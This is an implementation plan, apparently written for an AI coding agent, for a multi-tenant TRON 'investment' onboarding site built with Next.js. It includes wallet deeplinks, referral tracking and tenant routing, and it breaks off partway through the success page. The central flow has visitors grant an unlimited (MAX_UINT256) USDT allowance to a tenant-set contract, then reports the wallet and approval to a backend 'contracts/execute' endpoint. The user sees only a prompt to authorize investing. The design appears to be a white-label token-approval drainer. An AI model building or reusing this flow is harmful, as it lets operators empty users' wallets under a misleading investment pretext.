# Customer Web Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a Next.js customer-facing web application for investment onboarding with wallet integration and multi-tenant support

**Architecture:** Next.js 15 App Router with middleware-based tenant identification, dynamic tenant page loading, and TronWeb wallet integration

**Tech Stack:** Next.js 15, TypeScript, TailwindCSS, TronWeb SDK, React Hooks

---

## Task 1: Project Initialization

**Files:**
- Create: `apps/customer-web/next.config.js`
- Create: `apps/customer-web/tsconfig.json`
- Create: `apps/customer-web/tailwind.config.js`
- Create: `apps/customer-web/postcss.config.js`

**Step 1: Create Next.js configuration**

```javascript
// apps/customer-web/next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
  transpilePackages: ['@saas-platform/ui', '@saas-platform/theme'],
  env: {
    PLATFORM_API_URL: process.env.PLATFORM_API_URL || 'http://localhost:3000',
    TENANT_API_URL: process.env.TENANT_API_URL || 'http://localhost:3001',
  },
};

module.exports = nextConfig;
```

**Step 2: Create TypeScript configuration**

```json
// apps/customer-web/tsconfig.json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": {
    "target": "ES2022",
    "lib": ["dom", "dom.iterable", "esnext"],
    "allowJs": true,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "preserve",
    "incremental": true,
    "plugins": [{ "name": "next" }],
    "paths": {
      "@/*": ["./*"]
    }
  },
  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
  "exclude": ["node_modules"]
}
```

**Step 3: Create Tailwind configuration**

```javascript
// apps/customer-web/tailwind.config.js
/** @type {import('tailwindcss').Config} */
module.exports = {
  content: [
    './app/**/*.{js,ts,jsx,tsx,mdx}',
    './shared/**/*.{js,ts,jsx,tsx,mdx}',
    './tenants/**/*.{js,ts,jsx,tsx,mdx}',
  ],
  theme: {
    extend: {},
  },
  plugins: [],
};
```

**Step 4: Create PostCSS configuration**

```javascript
// apps/customer-web/postcss.config.js
module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};
```

**Step 5: Create global styles**

```css
// apps/customer-web/app/globals.css
@tailwind base;
@tailwind components;
@tailwind utilities;

body {
  margin: 0;
  padding: 0;
}
```

**Step 6: Verify configuration**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No TypeScript errors

---

## Task 2: TypeScript Type Definitions

**Files:**
- Create: `apps/customer-web/shared/types/global.d.ts`
- Create: `apps/customer-web/shared/types/tenant.ts`
- Create: `apps/customer-web/shared/types/wallet.ts`
- Create: `apps/customer-web/shared/types/index.ts`

**Step 1: Create TronWeb global types**

```typescript
// apps/customer-web/shared/types/global.d.ts
interface TronWeb {
  ready: boolean;
  defaultAddress: {
    base58: string;
    hex: string;
  };
  contract(): {
    at(address: string): Promise<any>;
  };
  toSun(amount: number): string;
  fromSun(amount: string): number;
}

interface Window {
  tronWeb?: TronWeb;
}
```

**Step 2: Create tenant types**

```typescript
// apps/customer-web/shared/types/tenant.ts
export interface TenantConfig {
  investmentContractAddress: string;
  usdtTokenAddress: string;
  branding?: {
    logo?: string;
    primaryColor?: string;
    secondaryColor?: string;
  };
}

export interface TenantInfo {
  slug: string;
  name: string;
  config: TenantConfig;
}

export interface TenantPageProps {
  tenantConfig: TenantConfig;
}
```

**Step 3: Create wallet types**

```typescript
// apps/customer-web/shared/types/wallet.ts
export type WalletType = 'tronlink' | 'imtoken' | 'tokenpocket';

export interface WalletConfig {
  name: string;
  buildDeeplink: (targetUrl: string) => string;
}

export interface WalletState {
  isReady: boolean;
  isConnected: boolean;
  address: string | null;
  error: AppError | null;
}

export interface ApproveState {
  isLoading: boolean;
  error: AppError | null;
  txHash: string | null;
}
```

**Step 4: Create type exports**

```typescript
// apps/customer-web/shared/types/index.ts
export * from './tenant';
export * from './wallet';
```

**Step 5: Verify types**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No TypeScript errors

---

## Task 3: Error Handling System

**Files:**
- Create: `apps/customer-web/shared/lib/errors.ts`

**Step 1: Create error codes and classes**

```typescript
// apps/customer-web/shared/lib/errors.ts
export enum ErrorCode {
  // Wallet related
  WALLET_NOT_FOUND = 'WALLET_NOT_FOUND',
  WALLET_NOT_CONNECTED = 'WALLET_NOT_CONNECTED',
  WALLET_WRONG_NETWORK = 'WALLET_WRONG_NETWORK',

  // Approval related
  APPROVE_REJECTED = 'APPROVE_REJECTED',
  APPROVE_FAILED = 'APPROVE_FAILED',
  INSUFFICIENT_BALANCE = 'INSUFFICIENT_BALANCE',

  // API related
  API_ERROR = 'API_ERROR',
  NETWORK_ERROR = 'NETWORK_ERROR',

  // Tenant related
  TENANT_NOT_FOUND = 'TENANT_NOT_FOUND',
}

export class AppError extends Error {
  constructor(
    public code: ErrorCode,
    public message: string,
    public originalError?: unknown,
  ) {
    super(message);
    this.name = 'AppError';
  }
}

export const errorMessages: Record<ErrorCode, string> = {
  [ErrorCode.WALLET_NOT_FOUND]: '請在錢包 App 中開啟此頁面',
  [ErrorCode.WALLET_NOT_CONNECTED]: '請先連接錢包',
  [ErrorCode.WALLET_WRONG_NETWORK]: '請切換到 TRON 主網',
  [ErrorCode.APPROVE_REJECTED]: '您已取消授權',
  [ErrorCode.APPROVE_FAILED]: '授權失敗，請重試',
  [ErrorCode.INSUFFICIENT_BALANCE]: '餘額不足',
  [ErrorCode.API_ERROR]: '系統錯誤，請稍後重試',
  [ErrorCode.NETWORK_ERROR]: '網絡連線異常',
  [ErrorCode.TENANT_NOT_FOUND]: '頁面不存在',
};
```

**Step 2: Verify no syntax errors**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 4: Wallet Configuration

**Files:**
- Create: `apps/customer-web/shared/lib/wallets/index.ts`
- Create: `apps/customer-web/shared/lib/wallets/tronlink.ts`
- Create: `apps/customer-web/shared/lib/wallets/imtoken.ts`
- Create: `apps/customer-web/shared/lib/wallets/tokenpocket.ts`

**Step 1: Create TronLink wallet config**

```typescript
// apps/customer-web/shared/lib/wallets/tronlink.ts
import { WalletConfig } from '@/shared/types/wallet';

export const tronlinkConfig: WalletConfig = {
  name: 'TronLink',
  buildDeeplink: (targetUrl: string) => {
    const param = {
      url: targetUrl,
      action: 'open',
      protocol: 'tronlink',
      version: '1.0',
    };
    return `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify(param))}`;
  },
};
```

**Step 2: Create imToken wallet config**

```typescript
// apps/customer-web/shared/lib/wallets/imtoken.ts
import { WalletConfig } from '@/shared/types/wallet';

export const imtokenConfig: WalletConfig = {
  name: 'imToken',
  buildDeeplink: (targetUrl: string) =>
    `imtokenv2://navigate?screen=DappView&url=${encodeURIComponent(targetUrl)}`,
};
```

**Step 3: Create TokenPocket wallet config**

```typescript
// apps/customer-web/shared/lib/wallets/tokenpocket.ts
import { WalletConfig } from '@/shared/types/wallet';

export const tokenpocketConfig: WalletConfig = {
  name: 'TokenPocket',
  buildDeeplink: (targetUrl: string) =>
    `tpdapp://open?params=${encodeURIComponent(JSON.stringify({ url: targetUrl }))}`,
};
```

**Step 4: Create wallet registry**

```typescript
// apps/customer-web/shared/lib/wallets/index.ts
import { WalletType, WalletConfig } from '@/shared/types/wallet';
import { tronlinkConfig } from './tronlink';
import { imtokenConfig } from './imtoken';
import { tokenpocketConfig } from './tokenpocket';

export const walletConfigs: Record<WalletType, WalletConfig> = {
  tronlink: tronlinkConfig,
  imtoken: imtokenConfig,
  tokenpocket: tokenpocketConfig,
};

export function getWalletConfig(walletType: WalletType): WalletConfig | null {
  return walletConfigs[walletType] || null;
}

export function buildWalletDeeplink(walletType: WalletType, targetUrl: string): string | null {
  const config = getWalletConfig(walletType);
  return config ? config.buildDeeplink(targetUrl) : null;
}
```

**Step 5: Verify types**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 5: Constants and Utilities

**Files:**
- Create: `apps/customer-web/shared/lib/constants.ts`
- Create: `apps/customer-web/shared/lib/storage.ts`

**Step 1: Create constants**

```typescript
// apps/customer-web/shared/lib/constants.ts
export const REFERRAL_CODE_KEY = 'referral_code';
export const TENANT_CACHE_TTL = 5 * 60 * 1000; // 5 minutes
export const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
export const WALLET_CONNECTION_DELAY = 500; // ms
```

**Step 2: Create localStorage utilities**

```typescript
// apps/customer-web/shared/lib/storage.ts
import { REFERRAL_CODE_KEY } from './constants';

export function saveReferralCode(code: string): void {
  if (typeof window !== 'undefined') {
    try {
      localStorage.setItem(REFERRAL_CODE_KEY, code);
    } catch (error) {
      console.error('Failed to save referral code:', error);
    }
  }
}

export function getReferralCode(): string | null {
  if (typeof window !== 'undefined') {
    try {
      return localStorage.getItem(REFERRAL_CODE_KEY);
    } catch (error) {
      console.error('Failed to get referral code:', error);
      return null;
    }
  }
  return null;
}

export function clearReferralCode(): void {
  if (typeof window !== 'undefined') {
    try {
      localStorage.removeItem(REFERRAL_CODE_KEY);
    } catch (error) {
      console.error('Failed to clear referral code:', error);
    }
  }
}
```

**Step 3: Verify no errors**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 6: API Client

**Files:**
- Create: `apps/customer-web/shared/lib/api.ts`

**Step 1: Create API functions**

```typescript
// apps/customer-web/shared/lib/api.ts
import { TenantInfo } from '@/shared/types';
import { AppError, ErrorCode } from './errors';

const PLATFORM_API_URL = process.env.NEXT_PUBLIC_PLATFORM_API_URL || process.env.PLATFORM_API_URL || 'http://localhost:3000';
const TENANT_API_URL = process.env.NEXT_PUBLIC_TENANT_API_URL || process.env.TENANT_API_URL || 'http://localhost:3001';

export async function getTenantByDomain(domain: string): Promise<TenantInfo | null> {
  try {
    const response = await fetch(
      `${PLATFORM_API_URL}/tenants/by-domain/${encodeURIComponent(domain)}`,
      { next: { revalidate: 300 } }
    );

    if (!response.ok) {
      if (response.status === 404) {
        return null;
      }
      throw new AppError(ErrorCode.API_ERROR, 'Failed to fetch tenant info');
    }

    return await response.json();
  } catch (error) {
    if (error instanceof AppError) {
      throw error;
    }
    throw new AppError(ErrorCode.NETWORK_ERROR, 'Network error', error);
  }
}

export interface RegisterCustomerParams {
  walletAddress: string;
  approvedAmount: number;
  approvalTxHash: string;
  referralCode?: string;
}

export async function registerCustomer(params: RegisterCustomerParams): Promise<any> {
  try {
    const response = await fetch(`${TENANT_API_URL}/contracts/execute`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });

    if (!response.ok) {
      throw new AppError(ErrorCode.API_ERROR, 'Failed to register customer');
    }

    return await response.json();
  } catch (error) {
    if (error instanceof AppError) {
      throw error;
    }
    throw new AppError(ErrorCode.NETWORK_ERROR, 'Network error', error);
  }
}
```

**Step 2: Verify types**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 7: Wallet Hook

**Files:**
- Create: `apps/customer-web/shared/hooks/useWallet.ts`

**Step 1: Create useWallet hook**

```typescript
// apps/customer-web/shared/hooks/useWallet.ts
'use client';

import { useState, useEffect } from 'react';
import { WalletState } from '@/shared/types/wallet';
import { AppError, ErrorCode } from '@/shared/lib/errors';
import { WALLET_CONNECTION_DELAY } from '@/shared/lib/constants';

export function useWallet(): WalletState {
  const [state, setState] = useState<WalletState>({
    isReady: false,
    isConnected: false,
    address: null,
    error: null,
  });

  useEffect(() => {
    const checkWallet = async () => {
      // Check if TronWeb exists
      if (typeof window.tronWeb === 'undefined') {
        setState({
          isReady: true,
          isConnected: false,
          address: null,
          error: new AppError(
            ErrorCode.WALLET_NOT_FOUND,
            '請在錢包 App 中開啟此頁面'
          ),
        });
        return;
      }

      // Wait for wallet injection to complete
      await new Promise(resolve => setTimeout(resolve, WALLET_CONNECTION_DELAY));

      const tronWeb = window.tronWeb;

      // Check if connected
      if (!tronWeb.ready) {
        setState({
          isReady: true,
          isConnected: false,
          address: null,
          error: new AppError(
            ErrorCode.WALLET_NOT_CONNECTED,
            '請先連接錢包'
          ),
        });
        return;
      }

      // Successfully connected
      setState({
        isReady: true,
        isConnected: true,
        address: tronWeb.defaultAddress.base58,
        error: null,
      });
    };

    checkWallet();
  }, []);

  return state;
}
```

**Step 2: Verify types**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 8: Approve Hook

**Files:**
- Create: `apps/customer-web/shared/hooks/useApprove.ts`

**Step 1: Create useApprove hook**

```typescript
// apps/customer-web/shared/hooks/useApprove.ts
'use client';

import { useState } from 'react';
import { ApproveState } from '@/shared/types/wallet';
import { AppError, ErrorCode } from '@/shared/lib/errors';
import { MAX_UINT256 } from '@/shared/lib/constants';

export function useApprove() {
  const [state, setState] = useState<ApproveState>({
    isLoading: false,
    error: null,
    txHash: null,
  });

  const approve = async (
    spenderAddress: string,
    tokenAddress: string,
  ): Promise<string> => {
    setState({ isLoading: true, error: null, txHash: null });

    try {
      const tronWeb = window.tronWeb;

      if (!tronWeb || !tronWeb.ready) {
        throw new AppError(ErrorCode.WALLET_NOT_CONNECTED, '錢包未連接');
      }

      const contract = await tronWeb.contract().at(tokenAddress);
      const tx = await contract.approve(spenderAddress, MAX_UINT256).send();

      setState({ isLoading: false, error: null, txHash: tx });
      return tx;

    } catch (err: any) {
      let error: AppError;

      if (err.message?.includes('cancel') || err.message?.includes('reject')) {
        error = new AppError(ErrorCode.APPROVE_REJECTED, '您已取消授權', err);
      } else if (err.message?.includes('balance')) {
        error = new AppError(ErrorCode.INSUFFICIENT_BALANCE, '餘額不足', err);
      } else {
        error = new AppError(ErrorCode.APPROVE_FAILED, '授權失敗，請重試', err);
      }

      setState({ isLoading: false, error, txHash: null });
      throw error;
    }
  };

  const reset = () => {
    setState({ isLoading: false, error: null, txHash: null });
  };

  return { ...state, approve, reset };
}
```

**Step 2: Verify types**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 9: Referral Hook

**Files:**
- Create: `apps/customer-web/shared/hooks/useReferral.ts`

**Step 1: Create useReferral hook**

```typescript
// apps/customer-web/shared/hooks/useReferral.ts
'use client';

import { useState, useEffect } from 'react';
import { getReferralCode, saveReferralCode } from '@/shared/lib/storage';

export function useReferral() {
  const [referralCode, setReferralCode] = useState<string | null>(null);

  useEffect(() => {
    const code = getReferralCode();
    setReferralCode(code);
  }, []);

  const saveCode = (code: string) => {
    saveReferralCode(code);
    setReferralCode(code);
  };

  return { referralCode, saveReferralCode: saveCode };
}
```

**Step 2: Verify types**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 10: Shared Components - Loading Spinner

**Files:**
- Create: `apps/customer-web/shared/components/LoadingSpinner.tsx`

**Step 1: Create LoadingSpinner component**

```typescript
// apps/customer-web/shared/components/LoadingSpinner.tsx
interface LoadingSpinnerProps {
  size?: 'sm' | 'md' | 'lg';
  className?: string;
}

export function LoadingSpinner({ size = 'md', className = '' }: LoadingSpinnerProps) {
  const sizeClasses = {
    sm: 'w-4 h-4 border-2',
    md: 'w-8 h-8 border-3',
    lg: 'w-12 h-12 border-4',
  };

  return (
    <div
      className={`${sizeClasses[size]} border-gray-300 border-t-blue-600 rounded-full animate-spin ${className}`}
      role="status"
      aria-label="Loading"
    />
  );
}
```

**Step 2: Verify component**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 11: Shared Components - Error Display

**Files:**
- Create: `apps/customer-web/shared/components/ErrorDisplay.tsx`

**Step 1: Create ErrorDisplay component**

```typescript
// apps/customer-web/shared/components/ErrorDisplay.tsx
import { AppError, errorMessages } from '@/shared/lib/errors';

interface ErrorDisplayProps {
  error: AppError;
  onRetry?: () => void;
}

export function ErrorDisplay({ error, onRetry }: ErrorDisplayProps) {
  return (
    <div className="p-4 bg-red-50 border border-red-200 rounded-lg">
      <p className="text-red-800 mb-2">
        {errorMessages[error.code] || error.message}
      </p>
      {onRetry && (
        <button
          onClick={onRetry}
          className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 transition-colors"
        >
          重試
        </button>
      )}
    </div>
  );
}
```

**Step 2: Verify component**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 12: Shared Components - Wallet Button

**Files:**
- Create: `apps/customer-web/shared/components/WalletButton.tsx`

**Step 1: Create WalletButton component**

```typescript
// apps/customer-web/shared/components/WalletButton.tsx
import { LoadingSpinner } from './LoadingSpinner';

interface WalletButtonProps {
  onClick: () => void;
  loading?: boolean;
  disabled?: boolean;
  children: React.ReactNode;
  className?: string;
}

export function WalletButton({
  onClick,
  loading = false,
  disabled = false,
  children,
  className = '',
}: WalletButtonProps) {
  return (
    <button
      onClick={onClick}
      disabled={disabled || loading}
      className={`px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed transition-colors flex items-center justify-center gap-2 ${className}`}
    >
      {loading && <LoadingSpinner size="sm" />}
      {children}
    </button>
  );
}
```

**Step 2: Verify component**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 13: Component Exports

**Files:**
- Create: `apps/customer-web/shared/components/index.ts`
- Create: `apps/customer-web/shared/hooks/index.ts`

**Step 1: Create component exports**

```typescript
// apps/customer-web/shared/components/index.ts
export { LoadingSpinner } from './LoadingSpinner';
export { ErrorDisplay } from './ErrorDisplay';
export { WalletButton } from './WalletButton';
```

**Step 2: Create hook exports**

```typescript
// apps/customer-web/shared/hooks/index.ts
export { useWallet } from './useWallet';
export { useApprove } from './useApprove';
export { useReferral } from './useReferral';
```

**Step 3: Verify exports**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 14: Middleware Setup

**Files:**
- Create: `apps/customer-web/middleware.ts`

**Step 1: Create middleware with tenant identification**

```typescript
// apps/customer-web/middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { TenantInfo } from './shared/types';

// In-memory cache
const tenantCache = new Map<string, { data: TenantInfo; expiry: number }>();
const CACHE_TTL = 5 * 60 * 1000; // 5 minutes

async function getTenantByDomain(domain: string): Promise<TenantInfo | null> {
  // Check cache
  const cached = tenantCache.get(domain);
  if (cached && cached.expiry > Date.now()) {
    return cached.data;
  }

  // Fetch from API
  try {
    const apiUrl = process.env.PLATFORM_API_URL || 'http://localhost:3000';
    const res = await fetch(
      `${apiUrl}/tenants/by-domain/${encodeURIComponent(domain)}`,
      { next: { revalidate: 300 } }
    );

    if (!res.ok) return null;

    const tenant = await res.json();

    // Store in cache
    tenantCache.set(domain, { data: tenant, expiry: Date.now() + CACHE_TTL });

    return tenant;
  } catch {
    return null;
  }
}

export async function middleware(request: NextRequest) {
  const hostname = request.headers.get('host')?.replace(':3000', '').replace(':3002', '') || '';
  const pathname = request.nextUrl.pathname;

  // Exclude paths that don't need processing
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api') ||
    pathname.match(/\.(ico|png|jpg|svg|css|js)$/)
  ) {
    return NextResponse.next();
  }

  // Redirect page doesn't need tenant identification (universal)
  if (pathname.startsWith('/redirect')) {
    return NextResponse.next();
  }

  const tenant = await getTenantByDomain(hostname);

  if (!tenant) {
    return NextResponse.rewrite(new URL('/not-found', request.url));
  }

  // Inject tenant info into headers
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-tenant-slug', tenant.slug);
  requestHeaders.set('x-tenant-config', JSON.stringify(tenant.config));

  return NextResponse.next({
    request: { headers: requestHeaders },
  });
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

**Step 2: Verify middleware**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 15: Root Layout

**Files:**
- Create: `apps/customer-web/app/layout.tsx`

**Step 1: Create root layout**

```typescript
// apps/customer-web/app/layout.tsx
import type { Metadata } from 'next';
import './globals.css';

export const metadata: Metadata = {
  title: 'Investment Platform',
  description: 'Customer Investment Platform',
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="zh-TW">
      <body>{children}</body>
    </html>
  );
}
```

**Step 2: Verify layout**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 16: Not Found Page

**Files:**
- Create: `apps/customer-web/app/not-found.tsx`

**Step 1: Create 404 page**

```typescript
// apps/customer-web/app/not-found.tsx
export default function NotFound() {
  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="text-center">
        <h1 className="text-4xl font-bold text-gray-900 mb-4">404</h1>
        <p className="text-gray-600">頁面不存在</p>
      </div>
    </div>
  );
}
```

**Step 2: Verify page**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 17: Redirect Page

**Files:**
- Create: `apps/customer-web/app/redirect/page.tsx`

**Step 1: Create redirect page**

```typescript
// apps/customer-web/app/redirect/page.tsx
'use client';

import { useEffect, useState } from 'react';
import { useSearchParams } from 'next/navigation';
import { buildWalletDeeplink } from '@/shared/lib/wallets';
import { saveReferralCode } from '@/shared/lib/storage';
import { WalletType } from '@/shared/types/wallet';
import { LoadingSpinner } from '@/shared/components';

export default function RedirectPage() {
  const searchParams = useSearchParams();
  const [error, setError] = useState<string | null>(null);
  const [showManualButton, setShowManualButton] = useState(false);
  const [deeplink, setDeeplink] = useState<string | null>(null);

  useEffect(() => {
    const ref = searchParams.get('ref');
    const wallet = searchParams.get('wallet') as WalletType;

    // Save referral code
    if (ref) {
      saveReferralCode(ref);
    }

    if (!wallet) {
      setError('缺少錢包參數');
      return;
    }

    // Build deeplink
    const targetUrl = window.location.origin;
    const deeplinkUrl = buildWalletDeeplink(wallet, targetUrl);

    if (!deeplinkUrl) {
      setError('不支援的錢包類型');
      return;
    }

    setDeeplink(deeplinkUrl);

    // Auto redirect
    window.location.href = deeplinkUrl;

    // Show manual button after 3 seconds
    const timer = setTimeout(() => {
      setShowManualButton(true);
    }, 3000);

    return () => clearTimeout(timer);
  }, [searchParams]);

  const handleManualOpen = () => {
    if (deeplink) {
      window.location.href = deeplink;
    }
  };

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <p className="text-red-600">{error}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="text-center">
        <LoadingSpinner size="lg" className="mx-auto mb-4" />
        <p className="text-gray-600 mb-4">正在打開錢包...</p>
        {showManualButton && (
          <button
            onClick={handleManualOpen}
            className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
          >
            手動打開錢包
          </button>
        )}
      </div>
    </div>
  );
}
```

**Step 2: Verify page**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

**Step 3: Test redirect page locally**

Run: `cd apps/customer-web && pnpm dev`
Navigate to: `http://localhost:3002/redirect?ref=ABC123&wallet=tronlink`
Expected: See "正在打開錢包..." message

---

## Task 18: Tenant Context

**Files:**
- Create: `apps/customer-web/shared/context/TenantContext.tsx`
- Create: `apps/customer-web/shared/hooks/useTenant.ts`

**Step 1: Create TenantContext**

```typescript
// apps/customer-web/shared/context/TenantContext.tsx
'use client';

import { createContext } from 'react';
import { TenantConfig } from '@/shared/types';

export const TenantContext = createContext<TenantConfig | null>(null);

interface TenantProviderProps {
  config: TenantConfig;
  children: React.ReactNode;
}

export function TenantProvider({ config, children }: TenantProviderProps) {
  return (
    <TenantContext.Provider value={config}>
      {children}
    </TenantContext.Provider>
  );
}
```

**Step 2: Create useTenant hook**

```typescript
// apps/customer-web/shared/hooks/useTenant.ts
'use client';

import { useContext } from 'react';
import { TenantContext } from '@/shared/context/TenantContext';

export function useTenant() {
  const context = useContext(TenantContext);

  if (!context) {
    throw new Error('useTenant must be used within TenantProvider');
  }

  return context;
}
```

**Step 3: Update hooks exports**

```typescript
// apps/customer-web/shared/hooks/index.ts
export { useWallet } from './useWallet';
export { useApprove } from './useApprove';
export { useReferral } from './useReferral';
export { useTenant } from './useTenant';
```

**Step 4: Verify context**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 19: Tenant Layout

**Files:**
- Create: `apps/customer-web/app/(tenant)/layout.tsx`

**Step 1: Create tenant layout with context**

```typescript
// apps/customer-web/app/(tenant)/layout.tsx
import { headers } from 'next/headers';
import { notFound } from 'next/navigation';
import { TenantProvider } from '@/shared/context/TenantContext';
import { TenantConfig } from '@/shared/types';

export default async function TenantLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const headersList = headers();
  const configStr = headersList.get('x-tenant-config');

  if (!configStr) {
    notFound();
  }

  const tenantConfig: TenantConfig = JSON.parse(configStr);

  return (
    <TenantProvider config={tenantConfig}>
      {children}
    </TenantProvider>
  );
}
```

**Step 2: Verify layout**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 20: Tenant Registry

**Files:**
- Create: `apps/customer-web/tenants/index.ts`

**Step 1: Create tenant registry**

```typescript
// apps/customer-web/tenants/index.ts
import { ComponentType } from 'react';
import { TenantPageProps } from '@/shared/types';

interface TenantPages {
  InvestPage: ComponentType<TenantPageProps>;
  SuccessPage: ComponentType<TenantPageProps>;
}

const tenantRegistry: Record<string, () => Promise<TenantPages>> = {
  'tenant-a': () => import('./tenant-a').then(m => ({
    InvestPage: m.InvestPage,
    SuccessPage: m.SuccessPage,
  })),
};

export async function getTenantPages(slug: string): Promise<TenantPages | null> {
  const loader = tenantRegistry[slug];
  if (!loader) return null;
  return loader();
}

export function isTenantRegistered(slug: string): boolean {
  return slug in tenantRegistry;
}
```

**Step 2: Verify registry**

Run: `cd apps/customer-web && pnpm type-check`
Expected: Error about missing tenant-a module (expected, will fix in next task)

---

## Task 21: Sample Tenant A - Invest Page

**Files:**
- Create: `apps/customer-web/tenants/tenant-a/InvestPage.tsx`
- Create: `apps/customer-web/tenants/tenant-a/index.ts`

**Step 1: Create Tenant A InvestPage**

```typescript
// apps/customer-web/tenants/tenant-a/InvestPage.tsx
'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { TenantPageProps } from '@/shared/types';
import { useWallet, useApprove, useReferral } from '@/shared/hooks';
import { registerCustomer } from '@/shared/lib/api';
import { LoadingSpinner, ErrorDisplay, WalletButton } from '@/shared/components';

export function InvestPage({ tenantConfig }: TenantPageProps) {
  const router = useRouter();
  const { isReady, isConnected, address, error: walletError } = useWallet();
  const { approve, isLoading: approving, error: approveError } = useApprove();
  const { referralCode } = useReferral();
  const [registering, setRegistering] = useState(false);
  const [error, setError] = useState<any>(null);

  const handleAuthorize = async () => {
    if (!isConnected || !address) return;

    try {
      setError(null);

      // 1. Approve
      const txHash = await approve(
        tenantConfig.investmentContractAddress,
        tenantConfig.usdtTokenAddress,
      );

      // 2. Register customer
      setRegistering(true);
      await registerCustomer({
        walletAddress: address,
        approvedAmount: -1, // Unlimited
        approvalTxHash: txHash,
        referralCode: referralCode || undefined,
      });

      // 3. Navigate to success page
      router.push('/success');
    } catch (err) {
      setError(err);
    } finally {
      setRegistering(false);
    }
  };

  if (!isReady) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  const displayError = error || approveError || walletError;

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8">
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">
            Tenant A Investment
          </h1>
          <p className="text-gray-600">
            授權您的錢包開始投資
          </p>
        </div>

        {displayError && (
          <div className="mb-6">
            <ErrorDisplay error={displayError} />
          </div>
        )}

        {isConnected && address && (
          <div className="mb-6 p-4 bg-gray-50 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">連接的錢包</p>
            <p className="text-sm font-mono text-gray-900 break-all">
              {address}
            </p>
          </div>
        )}

        {referralCode && (
          <div className="mb-6 p-4 bg-green-50 rounded-lg">
            <p className="text-sm text-green-800">
              推薦碼: <span className="font-semibold">{referralCode}</span>
            </p>
          </div>
        )}

        <WalletButton
          onClick={handleAuthorize}
          loading={approving || registering}
          disabled={!isConnected || approving || registering}
          className="w-full"
        >
          {approving ? '授權中...' : registering ? '註冊中...' : '授權投資'}
        </WalletButton>

        <p className="text-xs text-gray-500 text-center mt-4">
          點擊按鈕將授權平台使用您的 USDT
        </p>
      </div>
    </div>
  );
}
```

**Step 2: Create Tenant A exports**

```typescript
// apps/customer-web/tenants/tenant-a/index.ts
export { InvestPage } from './InvestPage';
export { SuccessPage } from './SuccessPage';
```

**Step 3: Verify component**

Run: `cd apps/customer-web && pnpm type-check`
Expected: Error about missing SuccessPage (will fix next)

---

## Task 22: Sample Tenant A - Success Page

**Files:**
- Create: `apps/customer-web/tenants/tenant-a/SuccessPage.tsx`

**Step 1: Create Tenant A SuccessPage**

```typescript
// apps/customer-web/tenants/tenant-a/SuccessPage.tsx
'use client';

import { TenantPageProps } from '@/shared/types';

export function SuccessPage({ tenantConfig }: TenantPageProps) {
  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 to-emerald-100">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
        <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg
            className="w-8 h-8 text-white"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={3}
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>

        <h1 className="text-3xl font-bold text-gray-900 mb-4">
          授權成功！
